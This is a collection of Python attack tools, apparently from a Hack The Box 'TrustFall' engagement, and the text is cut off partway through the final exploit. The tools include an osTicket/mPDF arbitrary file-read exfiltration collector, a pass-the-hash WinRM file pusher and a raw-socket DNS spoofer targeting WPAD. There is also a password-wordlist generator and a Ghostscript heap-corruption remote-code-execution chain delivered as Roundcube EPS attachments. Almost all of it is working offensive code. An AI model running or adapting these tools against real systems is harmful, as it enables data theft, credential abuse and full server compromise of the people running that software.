        assert self.ticket_id is not None
        page = self.request("GET", f"/tickets.php?id={self.ticket_id}")
        csrf = self._csrf(page.text)
        field = re.search(r'<textarea name="([^"]+)" id="message"', page.text)
        if not field:
            raise RuntimeError("Reply field not found")
        payload = subprocess.run(
            [sys.executable, str(self.generator), "-r", "-f", f"{path},{self.encoding}"],
            check=True, capture_output=True, text=True,
        ).stdout.strip()
        fields = {
            "__CSRFToken__": (None, csrf),
            "id": (None, str(self.ticket_id)),
            "a": (None, "reply"),
            field.group(1): (None, payload),
        }
        posted = self.request(
            "POST", f"/tickets.php?id={self.ticket_id}", files=fields,
            headers={"Referer": f"http://{self.host}/tickets.php?id={self.ticket_id}"},
        )
        if "Message Posted Successfully" not in posted.text:
            raise RuntimeError(f"Reply submission failed for {path}")

    def render(self) -> bytes:
        assert self.ticket_id is not None
        response = self.request("GET", f"/tickets.php?a=print&id={self.ticket_id}")
        if not response.content.startswith(b"%PDF"):
            raise RuntimeError(f"PDF render failed: HTTP {response.status_code}")
        return response.content

    def payloads(self, pdf: bytes) -> list[tuple[bytes, bool]]:
        results: list[tuple[bytes, bool]] = []
        document = fitz.open(stream=pdf, filetype="pdf")
        try:
            for page in document:
                for image in page.get_images(full=True):
                    try:
                        pixmap = fitz.Pixmap(document, image[0])
                        if pixmap.alpha:
                            pixmap = fitz.Pixmap(fitz.csRGB, pixmap)
                        pil_image = Image.frombytes(
                            "RGB", [pixmap.width, pixmap.height], pixmap.samples)
                        buffer = io.BytesIO()
                        pil_image.save(buffer, "BMP")
                        bitmap = buffer.getvalue()
                    except Exception:
                        continue
                    marker = b"\x1b$)C"
                    if marker not in bitmap:
                        continue
                    encoded = bitmap.partition(marker)[2].replace(b"\x00", b"").strip()
                    if self.encoding == "plain":
                        end = 0
                        for byte in encoded:
                            if byte in (9, 10, 13) or 0x20 <= byte <= 0x7e:
                                end += 1
                            else:
                                break
                        data = encoded[:end]
                        complete = len(data) < 44900
                    else:
                        decoded = bytearray()
                        for offset in range(0, len(encoded) - 3, 4):
                            try:
                                decoded.extend(base64.b64decode(
                                    encoded[offset:offset + 4], validate=True))
                            except Exception:
                                break
                        if self.encoding == "b64":
                            data = bytes(decoded)
                            complete = len(data) < 33600
                        else:
                            inflater = zlib.decompressobj(wbits=-15)
                            try:
                                data = inflater.decompress(bytes(decoded)) + inflater.flush()
                            except zlib.error:
                                data = b""
                            complete = inflater.eof
                    if data:
                        results.append((data, complete))
        finally:
            document.close()
        return results

    def save(self, remote_path: str, data: bytes, complete: bool) -> Path:
        destination = self.output / "rootfs" / remote_path.lstrip("/")
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(data)
        metadata = destination.with_name(destination.name + ".exfil.json")
        metadata.write_text(json.dumps({
            "remote_path": remote_path,
            "bytes": len(data),
            "complete_zlib_stream": complete,
            "ticket_id": self.ticket_id,
        }, indent=2) + "\n")
        return destination

    def collect(self, paths: list[str]) -> None:
        status_path = self.output / "status.jsonl"
        self.output.mkdir(parents=True, exist_ok=True)
        for index, path in enumerate(paths):
            if self.ticket_id is None or (index and index % self.batch_size == 0):
                self.create_ticket()
            self.add_path(path)
            try:
                pdf = self.render()
            except RuntimeError as error:
                status = {
                    "path": path,
                    "status": "render-failed",
                    "ticket_id": self.ticket_id,
                    "error": str(error),
                }
                print(f"[!] {path}: render failed; rotating ticket", flush=True)
                with status_path.open("a") as status_file:
                    status_file.write(json.dumps(status) + "\n")
                self.ticket_id = None
                continue
            found = self.payloads(pdf)
            new_payloads = [item for item in found
                            if hashlib.sha256(item[0]).digest() not in self.payload_hashes]
            if not new_payloads:
                status = {"path": path, "status": "missing-or-unreadable", "ticket_id": self.ticket_id}
                print(f"[-] {path}: missing or unreadable", flush=True)
            else:
                data, complete = new_payloads[-1]
                destination = self.save(path, data, complete)
                status = {
                    "path": path,
                    "status": "saved" if complete else "saved-truncated",
                    "bytes": len(data),
                    "ticket_id": self.ticket_id,
                    "local_path": str(destination),
                }
                suffix = "" if complete else " (TRUNCATED)"
                print(f"[+] {path}: {len(data)} bytes{suffix}", flush=True)
            self.payload_count = len(found)
            self.payload_hashes = {hashlib.sha256(item[0]).digest() for item in found}
            with status_path.open("a") as status_file:
                status_file.write(json.dumps(status) + "\n")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", default="10.129.114.157")
    parser.add_argument("--host", default="ticket.trustfall.htb")
    parser.add_argument("--cookie-jar", type=Path, default=Path("/tmp/ost3.cookie"))
    parser.add_argument("--generator", type=Path,
                        default=Path("/tmp/CVE-2026-22200/osticket_ticket_payload_gen.py"))
    parser.add_argument("--output", type=Path,
                        default=Path("/home/ronin/code/htb/trustfall/loot/file_read/systematic"))
    parser.add_argument("--batch-size", type=int, default=8)
    parser.add_argument("--ticket-id", type=int,
                        help="Reuse an already accessible ticket for the first batch")
    parser.add_argument("--encoding", choices=("plain", "b64", "b64zlib"),
                        default="b64")
    parser.add_argument("paths", nargs="*")
    args = parser.parse_args()
    paths = args.paths or DEFAULT_PATHS
    collector = Collector(args.ip, args.host, args.cookie_jar, args.generator,
                          args.output, args.batch_size, args.encoding)
    collector.ticket_id = args.ticket_id
    collector.collect(paths)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## tools/psrp_hash_push.py

```python

#!/usr/bin/env python3
"""Push a file through PSRP/WinRM using an NTLM LM:NT hash in chunks."""

import argparse
import base64
from pathlib import Path

from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan


def invoke(pool: RunspacePool, script: str) -> None:
    powershell = PowerShell(pool)
    powershell.add_script(script)
    output = powershell.invoke()
    if powershell.had_errors:
        raise RuntimeError("; ".join(str(item) for item in powershell.streams.error))
    for item in output:
        print(item)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True)
    parser.add_argument("--port", type=int, default=5985)
    parser.add_argument("--username", required=True)
    parser.add_argument("--hashes", required=True)
    parser.add_argument("--chunk-size", type=int, default=48 * 1024)
    parser.add_argument("local_path", type=Path)
    parser.add_argument("remote_path")
    args = parser.parse_args()

    connection = WSMan(
        args.server,
        port=args.port,
        ssl=False,
        auth="ntlm",
        username=args.username,
        password=args.hashes,
        encryption="auto",
        no_proxy=True,
    )
    remote = args.remote_path.replace("'", "''")
    data = args.local_path.read_bytes()

    with RunspacePool(connection) as pool:
        invoke(pool, f"[IO.File]::WriteAllBytes('{remote}',[byte[]]@())")
        for offset in range(0, len(data), args.chunk_size):
            encoded = base64.b64encode(data[offset : offset + args.chunk_size]).decode()
            invoke(
                pool,
                "$b=[Convert]::FromBase64String('"
                + encoded
                + "');$f=[IO.File]::Open('"
                + remote
                + "',[IO.FileMode]::Append,[IO.FileAccess]::Write,[IO.FileShare]::Read);"
                "$f.Write($b,0,$b.Length);$f.Close()",
            )
        invoke(pool, f"(Get-Item '{remote}').Length")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## tools/wpad_dns_spoof.py

```python

#!/usr/bin/env python3
"""Answer one targeted DNS A lookup observed on an Ethernet interface."""

import argparse
import socket
import struct
import time


def checksum(data):
    if len(data) & 1:
        data += b"\x00"
    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def mac_bytes(value):
    return bytes.fromhex(value.replace(":", ""))


def parse_qname(packet, offset):
    labels = []
    cursor = offset
    while cursor < len(packet):
        length = packet[cursor]
        cursor += 1
        if length == 0:
            break
        if length & 0xC0 or cursor + length > len(packet):
            return None, None
        labels.append(packet[cursor:cursor + length].decode("ascii", "ignore"))
        cursor += length
    return ".".join(labels).lower(), cursor


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    parser.add_argument("--victim-ip", required=True)
    parser.add_argument("--victim-mac", required=True)
    parser.add_argument("--dns-ip", required=True)
    parser.add_argument("--name", required=True)
    parser.add_argument("--answer", required=True)
    args = parser.parse_args()

    victim_mac = mac_bytes(args.victim_mac)
    attacker_mac = mac_bytes(open(f"/sys/class/net/{args.iface}/address").read().strip())
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    sock.bind((args.iface, 0))
    recent = {}
    wanted = args.name.rstrip(".").lower()
    print(f"watching {args.victim_ip} DNS A {wanted} -> {args.answer}", flush=True)

    while True:
        packet = sock.recv(65535)
        if len(packet) < 42 or packet[12:14] != b"\x08\x00":
            continue
        # Ignore forwarded/output copies; only accept the victim's inbound frame.
        if packet[6:12] != victim_mac or packet[0:6] != attacker_mac:
            continue
        ip = packet[14:]
        ihl = (ip[0] & 0x0F) * 4
        if len(ip) < ihl + 20 or ip[9] != 17:
            continue
        if socket.inet_ntoa(ip[12:16]) != args.victim_ip or socket.inet_ntoa(ip[16:20]) != args.dns_ip:
            continue
        udp = ip[ihl:]
        src_port, dst_port, udp_len, _ = struct.unpack("!HHHH", udp[:8])
        if dst_port != 53 or udp_len < 20 or len(udp) < udp_len:
            continue
        dns = udp[8:udp_len]
        txid, flags, qdcount, _, _, _ = struct.unpack("!HHHHHH", dns[:12])
        if flags & 0x8000 or qdcount != 1:
            continue
        qname, qend = parse_qname(dns, 12)
        if qname != wanted or qend is None or qend + 4 > len(dns):
            continue
        qtype, qclass = struct.unpack("!HH", dns[qend:qend + 4])
        if qtype != 1 or qclass != 1:
            continue
        key = (txid, src_port)
        now = time.monotonic()
        if now - recent.get(key, 0) < 2:
            continue
        recent[key] = now

        question = dns[12:qend + 4]
        answer = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 30, 4) + socket.inet_aton(args.answer)
        dns_response = struct.pack("!HHHHHH", txid, 0x8180, 1, 1, 0, 0) + question + answer
        udp_length = 8 + len(dns_response)
        udp_header = struct.pack("!HHHH", 53, src_port, udp_length, 0)
        pseudo = socket.inet_aton(args.dns_ip) + socket.inet_aton(args.victim_ip)
        pseudo += struct.pack("!BBH", 0, 17, udp_length)
        udp_sum = checksum(pseudo + udp_header + dns_response)
        udp_header = struct.pack("!HHHH", 53, src_port, udp_length, udp_sum or 0xFFFF)

        total_length = 20 + udp_length
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            0x45,
            0,
            total_length,
            txid,
            0,
            64,
            17,
            0,
            socket.inet_aton(args.dns_ip),
            socket.inet_aton(args.victim_ip),
        )
        ip_sum = checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack("!H", ip_sum) + ip_header[12:]
        frame = victim_mac + attacker_mac + b"\x08\x00" + ip_header + udp_header + dns_response
        sock.send(frame)
        print(f"spoofed txid={txid:#06x} port={src_port}", flush=True)


if __name__ == "__main__":
    main()
```

## trustfall_candidates.py

```python
#!/usr/bin/env python3

names = ("Santiago", "Alejandro", "Salvador")
departments = (
    "IT", "HR", "SALES", "SUPPORT", "HELPDESK", "FINANCE", "ADMIN",
    "OPERATIONS", "MARKETING", "ENGINEERING", "DEV", "DEVELOPMENT",
    "SECURITY", "SOC", "NETWORK", "NETWORKING", "INFRASTRUCTURE",
    "SYSTEMS", "SYSADMIN", "MANAGEMENT", "LEGAL", "PROCUREMENT",
    "ACCOUNTING", "CUSTOMER", "SERVICE", "MAIL", "TECH", "TECHNICAL",
    "ADMINISTRATION", "EXECUTIVE", "DEPARTMENT", "DESKTOP", "ENDPOINT",
    "DEVOPS", "SOFTWARE", "WEB", "QA", "QUALITY", "PROJECT", "PRODUCT",
    "RESEARCH", "RND", "DATABASE", "DBA", "CLOUD", "AUDIT", "COMPLIANCE",
    "RISK", "INFOSEC", "CYBERSECURITY", "LOGISTICS", "WAREHOUSE", "OFFICE",
    "FACILITIES", "BUSINESS", "CUSTOMERSERVICE", "CUSTOMERSUPPORT",
    "INFORMATIONTECHNOLOGY", "HUMANRESOURCES", "PUBLICRELATIONS", "PR",
    "TI", "VENTAS", "SOPORTE", "FINANZAS", "ADMINISTRACION", "OPERACIONES",
    "MARKETING", "INGENIERIA", "SEGURIDAD", "SISTEMAS", "REDES",
    "RECURSOSHUMANOS", "CONTABILIDAD", "COMPRAS", "LEGAL",
)

for company in ("TrustFall", "Trustfall", "TRUSTFALL"):
    for base_name in names:
        for name in (base_name, base_name.lower(), base_name.upper()):
            for base_department in departments:
                for department in (
                    base_department.upper(),
                    base_department.lower(),
                    base_department.title(),
                ):
                    for year in range(1900, 2027):
                        for year_text in (str(year), str(year)[1:], str(year)[2:]):
                            print(f"{company}{department}{name}{year_text}!")
```


{% raw %}

## tools/trustfall_heap_rce.py

```python
#!/usr/bin/env python3
"""Retryable end-to-end TrustFall Ghostscript heap-underwrite/IJS RCE chain.

The chain uses Salvador's two authenticated web applications:

1. Roundcube sends and thumbnails a crafted EPS attachment.
2. Ghostscript's CIDMap primitive forges a string reference and performs the
   calibrated two-byte underwrite of ``path_control_active``.
3. The osTicket/mPDF file-read primitive identifies that live ``gs`` process
   and discloses its mappings.
4. A first pointer targets a known ELF header so that same process discovers
   its live victim-array index; a second pointer targets path control.
5. The waiting Ghostscript process clears path control, configures a fresh IJS
   device, and reaches its ``sh -c`` server launcher to create a proof marker.

This is purpose-built for the TrustFall HTB target and intentionally validates
the expected heap-map size before releasing the corrupting pointer.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import importlib.util
import re
import struct
import subprocess
import sys
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path

import requests


WORKSPACE = Path(__file__).resolve().parents[1]
PROBES = WORKSPACE / "probes"
BUILD = PROBES / "build_cidmap_opvp_forge.sh"
EXPLOIT = PROBES / "ghostscript-cidmap-opvp-forge-liveijsauto.eps"
CLEANUP = PROBES / "ghostscript-opvp-pointer-cleanup.eps"
MARKER_PATH = "/tmp/trustfall-cidmap-ijs-rce"
DIAG_PATHS = (
    "/tmp/trustfall-path-scan",
    "/tmp/trustfall-ijs-diag",
)
FORGE_INDEX_PATH = "/tmp/trustfall-forge-index"


def stamp() -> str:
    return datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")


def log(message: str) -> None:
    print(f"[{datetime.now(timezone.utc).strftime('%H:%M:%S')}] {message}", flush=True)


def load_module(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot import {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


def load_netscape_cookies(session: requests.Session, path: Path) -> None:
    if not path.exists():
        return
    for line in path.read_text(errors="replace").splitlines():
        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")):
            continue
        fields = line.removeprefix("#HttpOnly_").split("\t")
        if len(fields) >= 7:
            session.cookies.set(fields[5], fields[6])


def roundcube_env(html: str, name: str) -> str:
    match = re.search(rf'"{re.escape(name)}":"([^"]+)"', html)
    if not match:
        raise RuntimeError(f"Roundcube environment value not found: {name}")
    return match.group(1)


class Roundcube:
    def __init__(self, args: argparse.Namespace):
        self.base = f"http://{args.ip}/"
        self.headers = {"Host": args.mail_host}
        self.username = args.mail_user
        self.password = args.mail_password
        self.recipient = args.mail_user
        self.thumbnail_delay = args.thumbnail_delay
        self.session = requests.Session()
        self.session.trust_env = False
        load_netscape_cookies(self.session, args.roundcube_cookie)

    def compose_context(self) -> tuple[str, str]:
        compose = self.session.get(
            self.base,
            params={"_task": "mail", "_action": "compose"},
            headers=self.headers,
            timeout=30,
        )
        compose.raise_for_status()
        if '"task":"login"' in compose.text:
            self.session.cookies.clear()
            page = self.session.get(self.base, headers=self.headers, timeout=30)
            page.raise_for_status()
            token = roundcube_env(page.text, "request_token")
            logged_in = self.session.post(
                self.base,
                data={
                    "_token": token,
                    "_task": "login",
                    "_action": "login",
                    "_timezone": "UTC",
                    "_url": "",
                    "_user": self.username,
                    "_pass": self.password,
                },
                headers=self.headers,
                timeout=30,
            )
            logged_in.raise_for_status()
            if '"task":"mail"' not in logged_in.text:
                raise RuntimeError("Roundcube login failed")
            compose = self.session.get(
                self.base,
                params={"_task": "mail", "_action": "compose"},
                headers=self.headers,
                timeout=30,
            )
            compose.raise_for_status()
        return roundcube_env(compose.text, "compose_id"), roundcube_env(
            compose.text, "request_token"
        )

    def send(self, attachment: Path, subject: str) -> tuple[str, str]:
        compose_id, token = self.compose_context()
        with attachment.open("rb") as handle:
            upload = self.session.post(
                self.base,
                params={
                    "_task": "mail",
                    "_action": "upload",
                    "_id": compose_id,
                    "_uploadid": "trustfall-rce",
                    "_from": "compose",
                    "_remote": "1",
                    "_token": token,
                },
                files={"_attachments[]": (attachment.name, handle, "image/x-eps")},
                headers=self.headers,
                timeout=30,
            )
        upload.raise_for_status()
        if '"action":"upload"' not in upload.text:
            raise RuntimeError("Roundcube attachment upload failed")

        sent = self.session.post(
            self.base,
            data={
                "_token": token,
                "_task": "mail",
                "_action": "send",
                "_id": compose_id,
                "_attachments": "",
                "_from": "3",
                "_to": self.recipient,
                "_subject": subject,
                "_message": "TrustFall rendering diagnostic.",
                "_store_target": "Sent",
            },
            headers=self.headers,
            timeout=60,
        )
        sent.raise_for_status()
        if "sent_successfully" not in sent.text:
            raise RuntimeError("Roundcube message send failed")

        for _ in range(20):
            time.sleep(1)
            listing = self.session.get(
                self.base,
                params={
                    "_task": "mail",
                    "_action": "list",
                    "_mbox": "INBOX",
                    "_refresh": "1",
                    "_remote": "1",
                    "_token": token,
                },
                headers=self.headers,
                timeout=30,
            )
            matches = re.findall(
                rf'this\.add_message_row\((\d+),\{{\\?"subject\\?":\\?"{re.escape(subject)}',
                listing.text,
            )
            if matches:
                return matches[-1], token
        raise RuntimeError("Roundcube message did not arrive in INBOX")

    def trigger(self, uid: str, token: str, timeout: int) -> requests.Response:
        return self.session.get(
            self.base,
            params={
                "_task": "mail",
                "_action": "get",
                "_mbox": "INBOX",
                "_uid": uid,
                "_part": "2",
                "_thumb": "1",
                "_token": token,
            },
            headers=self.headers,
            timeout=timeout,
        )

    def send_and_trigger(self, attachment: Path, subject: str, timeout: int = 90) -> requests.Response:
        uid, token = self.send(attachment, subject)
        log(f"Roundcube uid={uid} subject={subject!r}")
        if self.thumbnail_delay:
            log(f"thumbnail cooldown {self.thumbnail_delay:.1f}s")
            time.sleep(self.thumbnail_delay)
        return self.trigger(uid, token, timeout)


class FileRead:
    def __init__(self, args: argparse.Namespace, output: Path):
        file_module = load_module(
            "trustfall_osticket_file_exfil",
            WORKSPACE / "tools" / "osticket_file_exfil.py",
        )
        proc_module = load_module(
            "trustfall_osticket_proc_enum",
            WORKSPACE / "tools" / "osticket_proc_enum.py",
        )
        self.add_payload = proc_module.add_payload
        try:
            self.collector = file_module.Collector(
                args.ip,
                args.ticket_host,
                args.osticket_cookie,
                args.payload_generator,
                output,
                1,
                "b64zlib",
            )
        except (FileNotFoundError, RuntimeError):
            self.bootstrap_cookie(args)
            self.collector = file_module.Collector(
                args.ip,
                args.ticket_host,
                args.osticket_cookie,
                args.payload_generator,
                output,
                1,
                "b64zlib",
            )
        self.collector.request_timeout = args.osticket_timeout
        self.cooldown = args.ticket_cooldown
        self.args = args
        self.login()

    @staticmethod
    def bootstrap_cookie(args: argparse.Namespace) -> None:
        session = requests.Session()
        session.trust_env = False
        response = session.get(
            f"http://{args.ip}/login.php",
            headers={"Host": args.ticket_host},
            timeout=30,
        )
        response.raise_for_status()
        cookie = session.cookies.get("OSTSESSID")
        if not cookie:
            raise RuntimeError("osTicket did not issue an initial OSTSESSID")
        args.osticket_cookie.parent.mkdir(parents=True, exist_ok=True)
        args.osticket_cookie.write_text(
            "# Netscape HTTP Cookie File\n\n"
            f"#HttpOnly_.{args.ticket_host}\tTRUE\t/\tFALSE\t0\tOSTSESSID\t{cookie}\n"
        )

    def login(self) -> None:
        page = self.collector.request("GET", "/open.php")
        if "salvador@trustfall.htb" in page.text:
            return

        login = self.collector.request("GET", "/login.php")
        csrf = self.collector._csrf(login.text)
        posted = self.collector.request(
            "POST",
            "/login.php",
            data={
                "__CSRFToken__": csrf,
                "luser": self.args.portal_user,
                "lpasswd": self.args.portal_password,
            },
        )
        if posted.status_code not in (302, 303):
            raise RuntimeError(f"osTicket login failed: HTTP {posted.status_code}")
        check = self.collector.request("GET", "/open.php")
        if "salvador@trustfall.htb" not in check.text:
            raise RuntimeError("osTicket login did not establish a portal session")
        log("refreshed Salvador's osTicket session")

    def reset_ticket(self) -> None:
        self.collector.ticket_id = None
        self.collector.payload_count = 0
        self.collector.payload_hashes = set()

    def read(self, path: str) -> bytes | None:
        started = time.monotonic()
        log(f"file-read start path={path}")
        self.reset_ticket()
        self.collector.create_ticket()
        self.collector.add_path(path)
        found = self.collector.payloads(self.collector.render())
        if not found:
            log(
                f"file-read done path={path} result=missing "
                f"elapsed={time.monotonic() - started:.1f}s"
            )
            if self.cooldown:
                log(f"ticket cooldown {self.cooldown:.1f}s")
                time.sleep(self.cooldown)
            return None
        data, _complete = found[-1]
        log(
            f"file-read done path={path} bytes={len(data)} "
            f"elapsed={time.monotonic() - started:.1f}s"
        )
        if self.cooldown:
            log(f"ticket cooldown {self.cooldown:.1f}s")
            time.sleep(self.cooldown)
        return data

    def processes(self, first: int, last: int) -> list[tuple[int, str, int]]:
        started = time.monotonic()
        log(f"process census start range={first}..{last}")
        self.reset_ticket()
        self.collector.create_ticket()
        paths = [f"/proc/{pid}/status" for pid in range(first, last + 1)]
        self.add_payload(self.collector, paths)
        found: list[tuple[int, str, int]] = []
        for data, _complete in self.collector.payloads(self.collector.render()):
            pid_match = re.search(rb"^Pid:\s*(\d+)", data, re.MULTILINE)
            name_match = re.search(rb"^Name:\s*([^\n]+)", data, re.MULTILINE)
            uid_match = re.search(rb"^Uid:\s*(\d+)", data, re.MULTILINE)
            if pid_match and name_match and uid_match:
                found.append(
                    (
                        int(pid_match.group(1)),
                        name_match.group(1).decode(errors="replace"),
                        int(uid_match.group(1)),
                    )
                )
        log(
            f"process census done decoded={len(found)} "
            f"elapsed={time.monotonic() - started:.1f}s"
        )
        if self.cooldown:
            log(f"ticket cooldown {self.cooldown:.1f}s")
            time.sleep(self.cooldown)
        return found

    def process_maps(self, first: int, last: int) -> list[tuple[int, bytes]]:
        """Fetch status/maps pairs in one PDF render and retain GS mappings."""
        started = time.monotonic()
        log(f"combined status/maps census start range={first}..{last}")
        self.reset_ticket()
        self.collector.create_ticket()
        paths = [
            path
            for pid in range(first, last + 1)
            for path in (f"/proc/{pid}/status", f"/proc/{pid}/maps")
        ]
        self.add_payload(self.collector, paths)
        current_pid: int | None = None
        found: list[tuple[int, bytes]] = []
        for data, _complete in self.collector.payloads(self.collector.render()):
            pid_match = re.search(rb"^Pid:\s*(\d+)", data, re.MULTILINE)
            name_match = re.search(rb"^Name:\s*([^\n]+)", data, re.MULTILINE)
            uid_match = re.search(rb"^Uid:\s*(\d+)", data, re.MULTILINE)
            if pid_match and name_match and uid_match:
                current_pid = (
                    int(pid_match.group(1))
                    if name_match.group(1) == b"gs" and int(uid_match.group(1)) == 33
                    else None
                )
                continue
            if current_pid is not None and b"/usr/bin/gs" in data and b"[heap]" in data:
                found.append((current_pid, data))
                current_pid = None
        log(
            f"combined status/maps census done candidates={len(found)} "
            f"elapsed={time.monotonic() - started:.1f}s"
        )
        return found


@dataclass(frozen=True)
class GhostscriptProcess:
    pid: int
    heap_start: int
    heap_end: int
    maps: bytes


def make_pointer_writer(
    path: Path,
    address: int,
    remote_path: str,
    message: str,
    hold: bool = False,
) -> list[int]:
    raw = struct.pack("<Q", address)
    words = [raw[index] << 8 | raw[index + 1] for index in range(0, 8, 2)]
    text = (
        "%!PS-Adobe-3.0 EPSF-3.0\n"
        "%%BoundingBox: 0 0 240 72\n"
        f"/f ({remote_path}) (w) file def\n"
        f"f ({' '.join(str(word) for word in words)}\\n) writestring\n"
        "f closefile\n"
        + ("{} loop\n" if hold else "")
        + (
        "/Helvetica findfont 12 scalefont setfont\n"
        f"18 36 moveto ({message}) show\n"
        "showpage\n%%EOF\n"
        )
    )
    path.write_text(text)
    return words


def build_payload(args: argparse.Namespace) -> None:
    subprocess.run(
        ["bash", str(BUILD), "liveijsauto", str(args.victim_delta), "0"],
        cwd=WORKSPACE,
        check=True,
    )


def elf_probe_address(gs: GhostscriptProcess) -> int:
    """Return a readable mapping whose first byte is the ELF 0x7f marker."""
    for image in (rb"/usr/bin/gs", rb"/usr/lib/x86_64-linux-gnu/libgs.so.10.02"):
        match = re.search(
            rb"^([0-9a-f]+)-[0-9a-f]+\s+r--p\s+00000000\s+\S+\s+\S+\s+"
            + re.escape(image)
            + rb"$",
            gs.maps,
            re.MULTILINE,
        )
        if match:
            return int(match.group(1), 16)
    raise RuntimeError("could not locate a readable offset-zero ELF mapping")


def find_waiting_gs(
    oracle: FileRead,
    baseline: int,
    args: argparse.Namespace,
    attempt_dir: Path,
) -> GhostscriptProcess:
    # Reading ns_last_pid after the thumbnail starts gives a tight upper bound.
    last_raw = oracle.read("/proc/sys/kernel/ns_last_pid")
    if not last_raw:
        raise RuntimeError("could not read ns_last_pid")
    last = int(last_raw.strip())
    first = max(baseline - 4, last - args.pid_window)
    log(f"process census range={first}..{last} baseline={baseline}")

    candidates = [
        pid
        for pid, name, uid in oracle.processes(first, last)
        if name == "gs" and uid == 33
    ]
    if not candidates:
        raise RuntimeError("no www-data Ghostscript process found in census")

    for pid in sorted(candidates, reverse=True):
        maps = oracle.read(f"/proc/{pid}/maps")
        if not maps:
            continue
        (attempt_dir / f"gs-{pid}.maps").write_bytes(maps)
        match = re.search(
            rb"^([0-9a-f]+)-([0-9a-f]+)\s+rw-p\s+\S+\s+\S+\s+\S+\s+\[heap\]$",
            maps,
            re.MULTILINE,
        )
        if not match:
            continue
        start = int(match.group(1), 16)
        end = int(match.group(2), 16)
        size = end - start
        log(f"candidate gs pid={pid} heap={start:#x}-{end:#x} size={size:#x}")
        if size == args.expected_heap_size:
            return GhostscriptProcess(pid, start, end, maps)
    raise RuntimeError("Ghostscript found, but no heap map matched the calibrated size")


def find_waiting_gs_fast(
    oracle: FileRead,
    baseline: int,
    args: argparse.Namespace,
    attempt_dir: Path,
) -> GhostscriptProcess:
    first = max(1, baseline - 4)
    last = baseline + args.pid_window
    candidates = [
        pid
        for pid, name, uid in oracle.processes(first, last)
        if name == "gs" and uid == 33
    ]
    for pid in sorted(candidates, reverse=True):
        maps = oracle.read(f"/proc/{pid}/maps")
        if not maps:
            continue
        (attempt_dir / f"gs-{pid}.maps").write_bytes(maps)
        match = re.search(
            rb"^([0-9a-f]+)-([0-9a-f]+)\s+rw-p\s+\S+\s+\S+\s+\S+\s+\[heap\]$",
            maps,
            re.MULTILINE,
        )
        if not match:
            continue
        start = int(match.group(1), 16)
        end = int(match.group(2), 16)
        size = end - start
        log(f"candidate gs pid={pid} heap={start:#x}-{end:#x} size={size:#x}")
        if size == args.expected_heap_size:
            return GhostscriptProcess(pid, start, end, maps)
    raise RuntimeError("combined census did not find the waiting calibrated Ghostscript")


def read_last_pid(oracle: FileRead) -> int:
    raw = oracle.read("/proc/sys/kernel/ns_last_pid")
    if not raw:
        raise RuntimeError("could not establish PID baseline")
    return int(raw.strip())


def collect_diagnostics(oracle: FileRead, attempt_dir: Path) -> None:
    for remote in DIAG_PATHS:
        try:
            data = oracle.read(remote)
        except Exception as error:
            log(f"diagnostic {remote}: read error: {error}")
            continue
        if data is None:
            log(f"diagnostic {remote}: missing")
            continue
        destination = attempt_dir / Path(remote).name
        destination.write_bytes(data)
        log(f"diagnostic {remote}: {data.decode(errors='replace').strip()}")


def daemon_future(function, *args) -> concurrent.futures.Future:
    """Run a blocking request without making interpreter shutdown wait on it."""
    future: concurrent.futures.Future = concurrent.futures.Future()

    def worker() -> None:
        try:
            future.set_result(function(*args))
        except BaseException as error:
            future.set_exception(error)

    threading.Thread(target=worker, daemon=True).start()
    return future


def run_attempt(
    number: int,
    args: argparse.Namespace,
    root: Path,
) -> bool:
    attempt_dir = root / f"attempt-{number}"
    attempt_dir.mkdir(parents=True, exist_ok=True)
    if args.resume_baseline is None:
        log(f"attempt {number}/{args.attempts}: cleaning stale pointer and marker")
        cleanup = Roundcube(args).send_and_trigger(
            CLEANUP,
            f"TrustFall RCE cleanup {root.name}-{number}",
            timeout=args.pointer_timeout,
        )
        (attempt_dir / "cleanup-response.bin").write_bytes(cleanup.content)

        oracle = FileRead(args, attempt_dir / "file-read")
        cleanup_ready = oracle.read(FORGE_INDEX_PATH)
        if not cleanup_ready or not re.match(rb"0\s+0(?:\s|$)", cleanup_ready):
            raise RuntimeError("cleanup renderer did not publish its completion stamp")
        log("cleanup completion stamp verified; stale pointers removed")
        baseline = read_last_pid(oracle)
        log(f"PID baseline={baseline}")
    else:
        baseline = args.resume_baseline
        log(f"fast resume: reusing completed cleanup and PID baseline={baseline}")
        oracle = FileRead(args, attempt_dir / "file-read")

    build_payload(args)
    exploit_mail = Roundcube(args)
    exploit_uid, exploit_token = exploit_mail.send(
        EXPLOIT, f"TrustFall heap RCE {root.name}-{number}"
    )
    log(f"exploit mail uid={exploit_uid}; starting blocking thumbnail")
    if args.thumbnail_delay:
        log(f"thumbnail cooldown {args.thumbnail_delay:.1f}s")
        time.sleep(args.thumbnail_delay)
    exploit_future = daemon_future(
        exploit_mail.trigger, exploit_uid, exploit_token, args.trigger_timeout
    )
    time.sleep(args.gs_start_delay)

    # Even in resume mode, derive the current PID ceiling after the thumbnail
    # starts.  A busy target may not spawn Ghostscript until well after mail
    # delivery, making a baseline+fixed-window census race the render queue.
    gs = find_waiting_gs(oracle, baseline, args, attempt_dir)
    probe = elf_probe_address(gs)
    writer1 = attempt_dir / "pointer-stage1-elf.eps"
    words1 = make_pointer_writer(
        writer1,
        probe,
        "/tmp/trustfall-opvp-pointer",
